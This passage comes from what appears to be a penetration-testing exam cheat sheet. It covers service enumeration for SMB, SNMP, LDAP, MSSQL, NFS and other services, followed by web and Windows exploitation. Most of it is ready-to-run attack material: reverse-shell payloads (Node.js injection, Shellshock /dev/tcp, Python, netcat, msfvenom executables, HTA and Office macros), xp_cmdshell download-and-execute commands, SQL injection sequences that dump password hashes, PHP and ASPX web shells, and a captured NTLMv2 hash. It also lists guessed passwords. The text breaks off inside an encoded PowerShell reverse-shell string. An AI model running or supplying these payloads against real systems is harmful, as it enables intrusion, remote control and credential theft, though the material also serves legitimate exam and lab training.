smbmap -u null -p "" -H $IP -P 445 -x "ipconfig /all" 2>&1
````
rpcclient
````
rpcclient -U "" -N $IP
enumdomusers
enumdomgroups
queryuser 0x450
enumprinters
querydominfo
createdomuser
deletedomuser
lookupnames
lookupsids
lsaaddacctrights
lsaremoveacctrights
dsroledominfo
dsenumdomtrusts
````
enum4linux
````
enum4linux -a -M -l -d $IP 2>&1
enum4linux -a -u "" -p "" 192.168.180.71 && enum4linux -a -u "guest" -p "" $IP
````
crackmapexec
````
crackmapexec smb $IP
crackmapexec smb $IP -u "guest" -p ""
crackmapexec smb $IP --shares -u "guest" -p ""
crackmapexec smb $IP --shares -u "" -p ""
crackmapexec smb 10.1.1.68 -u 'guest' -p '' --users
````
smbclient
````
smbclient -U '%' -N \\\\<smb $IP>\\<share name>
smbclient -U 'guest' \\\\<smb $IP>\\<share name>
prompt off
recurse on
mget *
````
````
smbclient -U null -N \\\\<smb $IP>\\<share name>
````
````
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
smbclient -U '%' -N \\\\$IP\\<share name> -m SMB2
smbclient -U '%' -N \\\\$IP\\<share name> -m SMB3
````
##### smblient random port
````
smbclient -L \\192.168.214.125 -U "" -N -p 12445
Sharename       Type      Comment
        ---------       ----      -------
        Sarge       Disk      USERA Files
        IPC$            IPC       IPC Service (Samba 4.13.2)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.214.125 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
````
````
smbclient '//192.168.214.125/Sarge' -p 12445
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
````
#### IMAP port 143/993
##### Enumeration
````
nmap -p 143 --script imap-ntlm-info $IP
````
#### SNMP port 161 udp
````
sudo nmap --script snmp-* -sU -p161 $IP
sudo nmap -sU -p 161 --script snmp-brute $IP --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
````
````
snmpwalk -c public -v1 $IP
````
##### Hacktricks
````
https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
````
````
apt-get install snmp-mibs-downloader
sudo download-mibs
sudo vi /etc/snmp/snmp.conf
````
````
$ cat /etc/snmp/snmp.conf     
# As the snmp packages come without MIB files due to license reasons, loading
# of MIBs is disabled by default. If you added the MIBs you can reenable
# loading them by commenting out the following line.
#mibs :

# If you want to globally change where snmp libraries, commands and daemons
# look for MIBS, change the line below. Note you can set this for individual
# tools with the -M option or MIBDIRS environment variable.
#
# mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
````
````
sudo snmpbulkwalk -c public -v2c $IP .
sudo snmpbulkwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull 
````
#### LDAP port Port 389,636,3268,3269
````
ldapsearch -x -H ldap://192.168.214.122

# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object
text: 0000208D: NameErr: DSID-0310021C, problem 2001 (NO_OBJECT), data 0, best 
 match of:
        ''


# numResponses: 1
````
````
ldapsearch -x -H ldap://192.168.214.122 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=exampleH,DC=example
namingcontexts: CN=Configuration,DC=exampleH,DC=example
namingcontexts: CN=Schema,CN=Configuration,DC=exampleH,DC=example
namingcontexts: DC=DomainDnsZones,DC=exampleH,DC=example
namingcontexts: DC=ForestDnsZones,DC=exampleH,DC=example

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
````
````
ldapsearch -x -H ldap://192.168.214.122 -b "DC=exampleH,DC=example"
````
#### MSSQL port 1433
##### Enumeration
````
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP
````
##### Crackmapexec
````
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'

````
##### Logging in
````
sqsh -S $IP -U sa -P CrimsonQuiltScalp193 #linux
proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D msdb #windows
````
##### Expliotation
````
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go
xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
go
xp_cmdshell 'c:\Users\Public\reverse.exe"'
go
````
#### NFS port 2049
##### Enumeration
````
showmount $IP
showmount -e $IP
````
##### Mounting
````
sudo mount -o [options] -t nfs ip_address:share directory_to_mount
mkdir temp 
mount -t nfs -o vers=3 10.11.1.72:/home temp -o nolock
````
##### new user with new permissions
````
sudo groupadd -g 1014 <group name>
sudo groupadd -g 1014 1014
sudo useradd -u 1014 -g 1014 <user>
sudo useradd -u 1014 -g 1014 test
sudo passwd <user>
sudo passwd test
````
##### Changing permissions
The user cannot be logged in or active
````
sudo usermod -aG 1014 root
````
##### Changing owners
````
-rw------- 1 root root 3381 Sep 24  2020 id_rsa
````
````
sudo chown kali id_rsa
````
````
-rw------- 1 kali root 3381 Sep 24  2020 id_rsa
````

#### cgms? port 3003
##### Enumeration
````
nc -nv $IP 3003 #run this
````
````
help #run this
````
````
bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
````
````
version #run this
````
````
Aerospike Community Edition build 5.1.0.1
````
##### Exploitation
````
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443
nc -nlvp 443
````
#### MYSQL port 3306
##### Enumeration
````
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.11.1.8 
````
#### RDP port 3389
##### Enumeration
````
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $IP -Pn
````
##### Password Spray
````
crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
````
###### logging in
````
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
````
#### Postgresql port 5432,5433
##### RCE
````
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
````
##### Searchsploit RCE
````
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)
multiple/remote/50847.py
````
````
python3 50847.py -i 192.168.214.47 -p 5437 -c "busybox nc 192.168.45.191 80 -e sh"
````
#### Unkown Port
##### Enumeration
````
nc -nv $IP 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
````
````
help #always run this after your nc -nv command
````
#### Passwords Guessed
````
root:root
admin@example.com:admin
admin:admin
USERK:USERK #name of the box
cassie:cassie #Found users with exiftool
````
## Web Pentest <img src="https://cdn-icons-png.flaticon.com/512/1304/1304061.png" width="40" height="40" />
### Nodes.js(express)
```
Send this request through burpsuite
```
![image](https://github.com/xsudoxx/OSCP/assets/127046919/1957806a-feed-4cbe-8f6f-d475ac99c48a)

````
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1



full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3`
````
![image](https://github.com/xsudoxx/OSCP/assets/127046919/2b8e361a-4a2a-43b1-a2fa-ed41b2c8a846)
````
This time add a ;
````
````
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1



full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;
````

![image](https://github.com/xsudoxx/OSCP/assets/127046919/d9d57594-c10e-4755-b409-16d602a7f5f2)

````
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(80, "192.168.45.191", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
````
````
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1



full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;(function(){

    var net = require("net"),

        cp = require("child_process"),

        sh = cp.spawn("sh", []);

    var client = new net.Socket();

    client.connect(80, "192.168.45.191", function(){

        client.pipe(sh.stdin);

        sh.stdout.pipe(client);

        sh.stderr.pipe(client);

    });

    return /a/; // Prevents the Node.js application from crashing

})();
````
````
nc -nlvp 80  
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.250] 46956
id
uid=1000(observer) gid=1000(observer) groups=1000(observer)
````
### Shellshock
````
nikto -ask=no -h http://10.11.1.71:80 2>&1
OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability
````
````
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
http://10.11.1.71:80/cgi-bin/admin.cgi
````
### local File Inclusion
````
http://10.11.1.35/section.php?page=/etc/passwd
````
<img src="https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png" width="480" height="250" />

#### Enumeration
````
userE@demon:/var/www/internal/backend/index.php #this file lives 5 directories deep.
127.0.0.1:8000/backend/?view=../../../../../etc/passwd #So you have to add 5 ../ in order to read the files you want
````

### Remote File Inclusion
````
http://10.11.1.35/section.php?page=http://192.168.119.168:80/hacker.txt
````

<img src="https://user-images.githubusercontent.com/127046919/227788184-6f4fed8d-9c8e-4107-bf63-ff2cbfe9b751.png" width="480" height="250" />

### Command Injection
#### DNS Querying Service
##### windows
For background the DNS Querying Service is running nslookup and then querying the output. The way we figured this out was by inputing our own IP and getting back an error that is similar to one that nslookup would produce. With this in mind we can add the && character to append another command to the query:
````
&& whoami
````

<img src="https://user-images.githubusercontent.com/127046919/223560695-218399e2-2447-4b67-b93c-caee8e3ee3df.png" width="250" height="240" />

````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
&& certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
nc -nlvp 80
&& cmd /c C:\\Windows\\temp\\shell.exe
````
#### snmp manager
##### linux
````
For background on this box we had a snmp manager on port 4080 using whatweb i confirmed this was linux based. Off all of this I was able to login as admin:admin just on guessing the weak creds. When I got in I looked for random files and got Manager router tab which featured a section to ping the connectivity of the routers managed.
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.0.1
````
````
10.1.1.95:4080/ping_router.php?cmd=$myip
tcpdump -i tun0 icmp
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; wget http://192.168.119.140:8000/test.html
python3 -m http.server 8000
tcpdump -i tun0 icmp
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.140",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
````

### SQL Injection
#### Reference page
````
https://github.com/swisskyrepo/PayloadsAllTheThings
````
#### Testing sqli in every input field
````
';#---
````
#### MSSQL login page injection
##### Reference page
````
https://www.tarlogic.com/blog/red-team-tales-0x01/
````
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution
````
##### Exploitation
````
';EXEC master.dbo.xp_cmdshell 'ping 192.168.119.184';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.119.184:443/shell.exe C:\\Windows\temp\shell.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe';--
````
#### SQL and php login page
##### vulnerable code

````
found a db.php file/directory. In this case fuzzed with ffuf, the example in our ffuf bruteforcing login pages will help on this
````

````
<?php

include 'dbconnection.php';
$userid = $_POST['userid'];
$password = $_POST['password'];
$sql =
"SELECT * FROM users WHERE username = '$userid' AND password = '$password'";
$result = mysqli_query($db, $sql) or die(mysqli_error($db));
$num = mysqli_fetch_array($result);
	
if($num > 0) {
	echo "Login Success";
}
else {
	echo "Wrong User id or password";
}
?>
````
##### php sql login by pass

````
admin' -- ' --
````
#### Research Repo MariaDB

<img src="https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png" width="250" height="240" />

````
Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network
````

````
admin ' OR 1=1 --
````

````
1' OR 1 = 1#
````
#### Oracle DB bypass login

````
admin ' OR 1=1 --
````
#### Oracle UNION DB dumping creds

````
https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
````

````
' 
Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated 
' OR 1=1 -- #query
Blog entry from USERA with title The Great Escape from 2017
Blog entry from USERB with title I Love Crypto from 2016
Blog entry from USERC with title Man-in-the-middle from 2018
Blog entry from USERA with title To Paris and Back from 2019
Blog entry from Maria with title Software Development Lifecycle from 2018
Blog entry from Eric with title Accounting is Fun from 2019
' union select 1,2,3,4,5,6-- #query
java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected
 ' union select 1,2,3,4,5,6 from dual-- #Adjust for more or less columns
java.sql.SQLSyntaxErrorException: ORA-01789: query block has incorrect number of result columns
 ' union select 1,2,3 from dual-- #adjusted columns
java.sql.SQLSyntaxErrorException: ORA-01790: expression must have same datatype as corresponding expression ORA-01790: expression must have same datatype as corresponding expression 
 ' union select null,null,null from dual-- #query
Blog entry from null with title null from 0
' union select user,null,null from dual-- #query
Blog entry from example_APP with title null from 0
' union select table_name,null,null from all_tables-- #query
Blog entry from example_ADMINS with title null from 0
Blog entry from example_CONTENT with title null from 0
Blog entry from example_USERS with title null from 0
' union select column_name,null,null from all_tab_columns where table_name='example_ADMINS'-- #query
Blog entry from ADMIN_ID with title null from 0
Blog entry from ADMIN_NAME with title null from 0
Blog entry from PASSWORD with title null from 0
' union select ADMIN_NAME||PASSWORD,null,null from example_ADMINS-- #query
Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
````

#### MSSQL Error DB dumping creds
##### Reference Sheet

````
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
````

<img src="https://user-images.githubusercontent.com/127046919/228388326-934cba2a-2a41-42f2-981f-3c68cbaec7da.png" width="400" height="240" />

##### Example Case

````
' #Entered
Unclosed quotation mark after the character string '',')'. #response
````
###### Visualize the SQL statement being made

````
insert into dbo.tablename ('',''); 
#two statements Username and Email. Web Server says User added which indicates an insert statement
#we want to imagine what the query could potentially look like so we did a mock example above
insert into dbo.tablename (''',); #this would be created as an example of the error message above
````
##### Adjusting our initial Payload

````
insert into dbo.tablename ('1 AND 1=CONVERT(INT,@@version))--' ,''); #This is what is looks like
insert into dbo.tablename('',1 AND 1=CONVERT(INT,@@version))-- #Correct payload based on the above
',1 AND 1=CONVERT(INT,@@version))-- #Enumerate the DB
Server Error in '/Newsletter' Application.#Response
Incorrect syntax near the keyword 'AND'. #Response
',CONVERT(INT,@@version))-- #Corrected Payoad to adjust for the error
````
##### Enumerating DB Names

````
', CONVERT(INT,db_name(1)))--
master
', CONVERT(INT,db_name(2)))--
tempdb
', CONVERT(INT,db_name(3)))--
model
', CONVERT(INT,db_name(4)))--
msdb
', CONVERT(INT,db_name(5)))--
newsletter
', CONVERT(INT,db_name(6)))--
archive
````
##### Enumerating Table Names

````
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
pEXAMPLE
````
##### Enumerating number of Columns in selected Table

````
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE')+CHAR(58)+CHAR(58))))--
3 entries
````
##### Enumerate Column Names

````
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
alogin

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 2 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
id

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 3 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
psw
````
##### Enumerating Data in Columns

````
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
3c744b99b8623362b466efb7203fd182

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 2 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
5b413fe170836079622f4131fe6efa2d

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 3 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
7de6b6f0afadd89c3ed558da43930181

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 4 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
cb2d5be3c78be06d47b697468ad3b33b
````
### llmnr-poisoning-responder
#### http
````
https://juggernaut-sec.com/llmnr-poisoning-responder/
````
````
responder -I tun0 -wv
````
![image](https://user-images.githubusercontent.com/127046919/233516797-36702551-f60a-4d0e-866a-7c3a8e2971c1.png)

````

[+] Listening for events...                                                                                                                                                                                                                 

[HTTP] Sending NTLM authentication request to 192.168.54.165
[HTTP] GET request from: ::ffff:192.168.54.165  URL: / 
[HTTP] NTLMv2 Client   : 192.168.54.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
````
#### SMB
````
sudo responder -I tun0 -d -w
````
````
file://///<your $ip>/Share
````

![image](https://github.com/xsudoxx/OSCP/assets/127046919/a80cb512-fa68-4cf9-a8e1-565d70e52137)


![image](https://github.com/xsudoxx/OSCP/assets/127046919/2bb68b1f-70dc-4154-b961-3f42118b8495)


#### Cracking the hash
````
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
````
##### Hash
````
enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
````
### SSRF
SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.

<img src="https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png" width="250" height="240" />

#### Example attack

````
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.146.172 - - [09/Mar/2023 16:39:17] code 404, message File not found
192.168.146.172 - - [09/Mar/2023 16:39:17] "GET /test.html HTTP/1.1" 404 -
````

````
http://192.168.119.146/test.html
http://192.168.119.146/test.hta
````

## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" />
### Windows rce techniques
````
cat shell.php                   
echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php

http://<$Victim>/site/index.php?page=http://<Your $IP>:80/shell.php&cmd=ping <Your $IP>

tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
20:27:03.538792 IP 192.168.153.53 > 192.168.45.191: ICMP echo request, id 1, seq 1, length 40
20:27:03.539661 IP 192.168.45.191 > 192.168.153.53: ICMP echo reply, id 1, seq 1, length 40
````

````
locate nc.exe
impacket-smbserver -smb2support Share .
nc -nlvp 80
cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
````

````
cp /usr/share/webshells/asp/cmd-asp-5.1.asp . #IIS 5
ftp> put cmd-asp-5.1.asp
````

````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
cmd /c C:\\Windows\\temp\\shell.exe
C:\inetpub\wwwroot\shell.exe #Path to run in cmd.aspx, click Run
````

````
cp /usr/share/webshells/aspx/cmdasp.aspx .
cp /usr/share/windows-binaries/nc.exe .
ftp> put cmdasp.aspx
impacket-smbserver -smb2support Share .
http://<target $IP>:<port>/cmdasp.aspx
nc -nlvp <port on your kali>
cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $IP> <your nc port>
````

### HTA Attack in Action
We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
````
msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
````
### Exploiting Microsoft Office
When leveraging client-side vulnerabilities, it is important to use applications that are trusted by the victim in their everyday line of work. Unlike potentially suspicious-looking web links, Microsoft Office1 client-side attacks are often successful because it is difficult to differentiate malicious content from benign. In this section, we will explore various client-side attack vectors that leverage Microsoft Office applications
#### MSFVENOM
````
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.doc
````
#### Minitrue
````
https://github.com/X0RW3LL/Minitrue
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
````
#### Microsoft Word Macro
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
````
Create the .doc file 
````
````
Use the base64 powershell code from revshells.com
````
````
Used this code to inline macro(Paste the code from revshells in str variable) :

str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA3ADQAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBk